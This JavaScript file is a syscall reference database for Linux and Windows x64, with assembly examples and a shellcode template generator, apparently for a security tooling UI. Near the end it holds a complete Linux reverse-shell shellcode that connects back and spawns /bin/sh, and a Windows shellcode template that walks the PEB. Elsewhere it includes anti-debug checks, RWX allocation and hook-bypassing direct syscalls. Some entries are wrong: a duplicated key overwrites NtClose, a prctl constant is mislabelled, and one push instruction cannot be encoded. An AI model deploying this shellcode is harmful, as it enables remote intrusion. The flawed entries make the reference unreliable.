/**
 * 🔥 SYSCALLS DATABASE - THE ULTIMATE COLLECTION
 * Linux x64 + Windows x64 syscalls with examples
 */

const SYSCALLS_DB = {
    linux: {
        // File Operations
        0: {
            name: "read",
            signature: "ssize_t read(int fd, void *buf, size_t count)",
            args: {
                rax: 0,
                rdi: "file descriptor",
                rsi: "buffer pointer",
                rdx: "count"
            },
            description: "Read from a file descriptor",
            category: "file",
            example: `
; Read 100 bytes from stdin
mov rax, 0          ; sys_read
mov rdi, 0          ; stdin
lea rsi, [buffer]   ; buffer address
mov rdx, 100        ; 100 bytes
syscall
; Check return value in RAX`,
            notes: "Returns number of bytes read or -1 on error"
        },
        1: {
            name: "write",
            signature: "ssize_t write(int fd, const void *buf, size_t count)",
            args: {
                rax: 1,
                rdi: "file descriptor",
                rsi: "buffer pointer",
                rdx: "count"
            },
            description: "Write to a file descriptor",
            category: "file",
            example: `
; Write string to stdout
mov rax, 1          ; sys_write
mov rdi, 1          ; stdout
lea rsi, [msg]      ; message address
mov rdx, msg_len    ; message length
syscall`,
            notes: "Returns number of bytes written"
        },
        2: {
            name: "open",
            signature: "int open(const char *pathname, int flags, mode_t mode)",
            args: {
                rax: 2,
                rdi: "pathname",
                rsi: "flags",
                rdx: "mode"
            },
            description: "Open a file",
            category: "file",
            example: `
; Open file for reading
mov rax, 2          ; sys_open
lea rdi, [filename] ; filename string
mov rsi, 0          ; O_RDONLY
mov rdx, 0          ; mode (ignored for O_RDONLY)
syscall
; File descriptor returned in RAX`,
            notes: "Flags: O_RDONLY=0, O_WRONLY=1, O_RDWR=2, O_CREAT=0x40"
        },
        3: {
            name: "close",
            signature: "int close(int fd)",
            args: {
                rax: 3,
                rdi: "file descriptor"
            },
            description: "Close a file descriptor",
            category: "file",
            example: `
mov rax, 3          ; sys_close
mov rdi, rbx        ; fd in rbx
syscall`
        },
        
        // Process Control
        39: {
            name: "getpid",
            signature: "pid_t getpid(void)",
            args: {
                rax: 39
            },
            description: "Get process ID",
            category: "process",
            example: `
mov rax, 39         ; sys_getpid
syscall
; PID returned in RAX`
        },
        57: {
            name: "fork",
            signature: "pid_t fork(void)",
            args: {
                rax: 57
            },
            description: "Create a child process",
            category: "process",
            example: `
mov rax, 57         ; sys_fork
syscall
test rax, rax
jz child_process    ; RAX = 0 in child
; Parent continues here with child PID in RAX`
        },
        59: {
            name: "execve",
            signature: "int execve(const char *pathname, char *const argv[], char *const envp[])",
            args: {
                rax: 59,
                rdi: "pathname",
                rsi: "argv[]",
                rdx: "envp[]"
            },
            description: "Execute program",
            category: "process",
            example: `
; Execute /bin/sh
mov rax, 59         ; sys_execve
lea rdi, [shell]    ; "/bin/sh"
xor rsi, rsi        ; argv = NULL
xor rdx, rdx        ; envp = NULL
syscall

shell: db "/bin/sh", 0`
        },
        60: {
            name: "exit",
            signature: "void exit(int status)",
            args: {
                rax: 60,
                rdi: "exit status"
            },
            description: "Terminate the calling process",
            category: "process",
            example: `
mov rax, 60         ; sys_exit
xor rdi, rdi        ; exit code 0
syscall`
        },
        62: {
            name: "kill",
            signature: "int kill(pid_t pid, int sig)",
            args: {
                rax: 62,
                rdi: "pid",
                rsi: "signal"
            },
            description: "Send signal to a process",
            category: "process",
            example: `
mov rax, 62         ; sys_kill
mov rdi, 1234       ; target PID
mov rsi, 9          ; SIGKILL
syscall`
        },
        
        // Memory Management
        9: {
            name: "mmap",
            signature: "void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)",
            args: {
                rax: 9,
                rdi: "addr",
                rsi: "length",
                rdx: "prot",
                r10: "flags",
                r8: "fd",
                r9: "offset"
            },
            description: "Map files or devices into memory",
            category: "memory",
            example: `
; Allocate 4096 bytes of memory
mov rax, 9          ; sys_mmap
xor rdi, rdi        ; addr = NULL (let kernel choose)
mov rsi, 0x1000     ; 4096 bytes
mov rdx, 7          ; PROT_READ|PROT_WRITE|PROT_EXEC
mov r10, 0x22       ; MAP_PRIVATE|MAP_ANONYMOUS
mov r8, -1          ; fd = -1 (no file)
xor r9, r9          ; offset = 0
syscall
; Address returned in RAX`,
            notes: "PROT: READ=1, WRITE=2, EXEC=4. FLAGS: PRIVATE=2, ANONYMOUS=0x20"
        },
        11: {
            name: "munmap",
            signature: "int munmap(void *addr, size_t length)",
            args: {
                rax: 11,
                rdi: "addr",
                rsi: "length"
            },
            description: "Unmap files or devices from memory",
            category: "memory",
            example: `
mov rax, 11         ; sys_munmap
mov rdi, rbx        ; address to unmap
mov rsi, 0x1000     ; length
syscall`
        },
        12: {
            name: "brk",
            signature: "int brk(void *addr)",
            args: {
                rax: 12,
                rdi: "addr"
            },
            description: "Change data segment size",
            category: "memory",
            example: `
; Get current break
mov rax, 12         ; sys_brk
xor rdi, rdi        ; addr = 0 to get current
syscall
; Current break in RAX

; Extend by 0x1000 bytes
lea rdi, [rax+0x1000]
mov rax, 12
syscall`
        },
        
        // Network
        41: {
            name: "socket",
            signature: "int socket(int domain, int type, int protocol)",
            args: {
                rax: 41,
                rdi: "domain",
                rsi: "type",
                rdx: "protocol"
            },
            description: "Create a socket",
            category: "network",
            example: `
; Create TCP socket
mov rax, 41         ; sys_socket
mov rdi, 2          ; AF_INET
mov rsi, 1          ; SOCK_STREAM
xor rdx, rdx        ; protocol = 0
syscall
; Socket fd in RAX`
        },
        42: {
            name: "connect",
            signature: "int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)",
            args: {
                rax: 42,
                rdi: "sockfd",
                rsi: "sockaddr",
                rdx: "addrlen"
            },
            description: "Initiate a connection on a socket",
            category: "network",
            example: `
; Connect to 127.0.0.1:1337
mov rax, 42         ; sys_connect
mov rdi, r12        ; socket fd
lea rsi, [addr]     ; sockaddr structure
mov rdx, 16         ; sizeof(sockaddr_in)
syscall

addr:
    dw 2            ; AF_INET
    dw 0x3905       ; port 1337 (big-endian)
    dd 0x0100007f   ; 127.0.0.1 (big-endian)`
        },
        49: {
            name: "bind",
            signature: "int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)",
            args: {
                rax: 49,
                rdi: "sockfd",
                rsi: "sockaddr",
                rdx: "addrlen"
            },
            description: "Bind a name to a socket",
            category: "network"
        },
        50: {
            name: "listen",
            signature: "int listen(int sockfd, int backlog)",
            args: {
                rax: 50,
                rdi: "sockfd",
                rsi: "backlog"
            },
            description: "Listen for connections on a socket",
            category: "network"
        },
        
        // Ptrace (debugging)
        101: {
            name: "ptrace",
            signature: "long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data)",
            args: {
                rax: 101,
                rdi: "request",
                rsi: "pid",
                rdx: "addr",
                r10: "data"
            },
            description: "Process trace - debugging syscall",
            category: "debug",
            example: `
; Check if being debugged
mov rax, 101        ; sys_ptrace
xor rdi, rdi        ; PTRACE_TRACEME
xor rsi, rsi
xor rdx, rdx
xor r10, r10
syscall
; Returns -1 if already being traced`,
            notes: "PTRACE_TRACEME=0, PTRACE_ATTACH=16, PTRACE_DETACH=17"
        },
        
        // Security
        157: {
            name: "prctl",
            signature: "int prctl(int option, unsigned long arg2, ...)",
            args: {
                rax: 157,
                rdi: "option",
                rsi: "arg2",
                rdx: "arg3",
                r10: "arg4",
                r8: "arg5"
            },
            description: "Operations on a process",
            category: "security",
            example: `
; Disable ptrace
mov rax, 157        ; sys_prctl
mov rdi, 0x59616d61 ; PR_SET_DUMPABLE
xor rsi, rsi        ; not dumpable
syscall`
        },
        
        // Special
        231: {
            name: "exit_group",
            signature: "void exit_group(int status)",
            args: {
                rax: 231,
                rdi: "status"
            },
            description: "Exit all threads in a process",
            category: "process"
        }
    },
    
    windows: {
        // Process and Thread
        0x0055: {
            name: "NtCreateFile",
            signature: "NTSTATUS NtCreateFile(...)",
            args: {
                rcx: "FileHandle",
                rdx: "DesiredAccess",
                r8: "ObjectAttributes",
                r9: "IoStatusBlock",
                stack: ["AllocationSize", "FileAttributes", "ShareAccess", "CreateDisposition", "CreateOptions", "EaBuffer", "EaLength"]
            },
            description: "Creates or opens a file",
            category: "file",
            example: `
; Windows x64 syscall
mov r10, rcx        ; Save first param
mov eax, 0x55       ; NtCreateFile syscall number
syscall
; NTSTATUS in RAX`,
            notes: "Direct syscall bypasses user-mode hooks"
        },
        0x0018: {
            name: "NtClose",
            signature: "NTSTATUS NtClose(HANDLE Handle)",
            args: {
                rcx: "Handle"
            },
            description: "Closes an object handle",
            category: "handle",
            example: `
mov r10, rcx
mov eax, 0x18
syscall`
        },
        0x002C: {
            name: "NtOpenProcess",
            signature: "NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)",
            args: {
                rcx: "ProcessHandle",
                rdx: "DesiredAccess",
                r8: "ObjectAttributes",
                r9: "ClientId"
            },
            description: "Opens an existing process",
            category: "process",
            example: `
; Open process with PID
lea rcx, [hProcess]
mov rdx, PROCESS_ALL_ACCESS
lea r8, [objAttr]
lea r9, [clientId]
mov r10, rcx
mov eax, 0x2C
syscall`
        },
        0x002D: {
            name: "NtTerminateProcess",
            signature: "NTSTATUS NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus)",
            args: {
                rcx: "ProcessHandle",
                rdx: "ExitStatus"
            },
            description: "Terminates a process",
            category: "process"
        },
        0x0019: {
            name: "NtQueryInformationProcess",
            signature: "NTSTATUS NtQueryInformationProcess(...)",
            args: {
                rcx: "ProcessHandle",
                rdx: "ProcessInformationClass",
                r8: "ProcessInformation",
                r9: "ProcessInformationLength",
                stack: ["ReturnLength"]
            },
            description: "Retrieves information about a process",
            category: "process",
            example: `
; Check if being debugged
mov rcx, -1         ; Current process
mov rdx, 7          ; ProcessDebugPort
lea r8, [buffer]
mov r9, 8
lea rax, [retLen]
mov [rsp+0x20], rax
mov r10, rcx
mov eax, 0x19
syscall`
        },
        
        // Memory Management
        0x0018: {
            name: "NtAllocateVirtualMemory",
            signature: "NTSTATUS NtAllocateVirtualMemory(...)",
            args: {
                rcx: "ProcessHandle",
                rdx: "BaseAddress",
                r8: "ZeroBits",
                r9: "RegionSize",
                stack: ["AllocationType", "Protect"]
            },
            description: "Reserves or commits virtual memory",
            category: "memory",
            example: `
; Allocate RWX memory
mov rcx, -1         ; Current process
lea rdx, [baseAddr] ; Address pointer
xor r8, r8          ; ZeroBits
lea r9, [size]      ; Size pointer
mov qword [rsp+0x20], MEM_COMMIT|MEM_RESERVE
mov qword [rsp+0x28], PAGE_EXECUTE_READWRITE
mov r10, rcx
mov eax, 0x18
syscall`
        },
        0x001B: {
            name: "NtFreeVirtualMemory",
            signature: "NTSTATUS NtFreeVirtualMemory(...)",
            args: {
                rcx: "ProcessHandle",
                rdx: "BaseAddress",
                r8: "RegionSize",
                r9: "FreeType"
            },
            description: "Releases virtual memory",
            category: "memory"
        },
        0x0050: {
            name: "NtProtectVirtualMemory",
            signature: "NTSTATUS NtProtectVirtualMemory(...)",
            args: {
                rcx: "ProcessHandle",
                rdx: "BaseAddress",
                r8: "NumberOfBytesToProtect",
                r9: "NewAccessProtection",
                stack: ["OldAccessProtection"]
            },
            description: "Changes protection on virtual memory",
            category: "memory"
        },
        
        // Anti-Debug
        0x007: {
            name: "NtQuerySystemInformation",
            signature: "NTSTATUS NtQuerySystemInformation(...)",
            args: {
                rcx: "SystemInformationClass",
                rdx: "SystemInformation",
                r8: "SystemInformationLength",
                r9: "ReturnLength"
            },
            description: "Retrieves system information",
            category: "system",
            example: `
; Check for kernel debugger
mov rcx, 0x23       ; SystemKernelDebuggerInformation
lea rdx, [buffer]
mov r8, 2
lea r9, [retLen]
mov r10, rcx
mov eax, 0x7
syscall`
        }
    }
};

// Helper functions for syscall analysis
const SYSCALL_HELPERS = {
    // Get syscall by number
    getSyscallByNumber(os, number) {
        return os === 'linux' ? SYSCALLS_DB.linux[number] : SYSCALLS_DB.windows[number];
    },
    
    // Get syscalls by category
    getSyscallsByCategory(os, category) {
        const db = os === 'linux' ? SYSCALLS_DB.linux : SYSCALLS_DB.windows;
        return Object.entries(db)
            .filter(([_, syscall]) => syscall.category === category)
            .map(([num, syscall]) => ({...syscall, number: num}));
    },
    
    // Search syscalls
    searchSyscalls(os, query) {
        const db = os === 'linux' ? SYSCALLS_DB.linux : SYSCALLS_DB.windows;
        const lowerQuery = query.toLowerCase();
        return Object.entries(db)
            .filter(([_, syscall]) => 
                syscall.name.toLowerCase().includes(lowerQuery) ||
                syscall.description.toLowerCase().includes(lowerQuery))
            .map(([num, syscall]) => ({...syscall, number: num}));
    },
    
    // Generate shellcode template
    generateShellcode(os, syscallName) {
        const db = os === 'linux' ? SYSCALLS_DB.linux : SYSCALLS_DB.windows;
        const syscall = Object.entries(db).find(([_, s]) => s.name === syscallName);
        if (!syscall) return null;
        
        const [number, details] = syscall;
        let shellcode = `; ${details.name} shellcode\n`;
        
        if (os === 'linux') {
            shellcode += `mov rax, ${number}  ; ${details.name}\n`;
            if (details.args.rdi) shellcode += `mov rdi, ?  ; ${details.args.rdi}\n`;
            if (details.args.rsi) shellcode += `mov rsi, ?  ; ${details.args.rsi}\n`;
            if (details.args.rdx) shellcode += `mov rdx, ?  ; ${details.args.rdx}\n`;
            if (details.args.r10) shellcode += `mov r10, ?  ; ${details.args.r10}\n`;
            if (details.args.r8) shellcode += `mov r8, ?   ; ${details.args.r8}\n`;
            if (details.args.r9) shellcode += `mov r9, ?   ; ${details.args.r9}\n`;
            shellcode += 'syscall\n';
        } else {
            shellcode += `mov r10, rcx\nmov eax, ${number}  ; ${details.name}\nsyscall\n`;
        }
        
        return shellcode;
    },
    
    // Common syscall sequences
    COMMON_SEQUENCES: {
        linux_reverse_shell: `
; Linux x64 reverse shell
; socket(AF_INET, SOCK_STREAM, 0)
mov rax, 41
mov rdi, 2
mov rsi, 1
xor rdx, rdx
syscall
mov r12, rax  ; save socket fd

; connect(fd, &addr, 16)
mov rdi, r12
push 0x0100007f  ; 127.0.0.1
push word 0x3905 ; port 1337
push word 2     ; AF_INET
mov rsi, rsp
mov rdx, 16
mov rax, 42
syscall

; dup2(fd, 0/1/2)
mov rdi, r12
xor rsi, rsi
mov rax, 33
syscall
inc rsi
mov rax, 33
syscall
inc rsi
mov rax, 33
syscall

; execve("/bin/sh", 0, 0)
push 0x68732f6e69622f  ; "/bin/sh"
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall`,

        windows_shellcode: `
; Windows x64 shellcode template
; Get kernel32 base
mov rax, gs:[0x60]  ; PEB
mov rax, [rax+0x18] ; PEB_LDR_DATA
mov rax, [rax+0x20] ; InMemoryOrderModuleList
mov rax, [rax]      ; 2nd entry
mov rax, [rax]      ; 3rd entry (kernel32)
mov rbx, [rax+0x20] ; DllBase

; Direct syscall example
mov r10, rcx
mov eax, 0x18  ; NtClose
syscall`
    }
};

// Export for use in UI
window.SYSCALLS_DB = SYSCALLS_DB;
window.SYSCALL_HELPERS = SYSCALL_HELPERS;
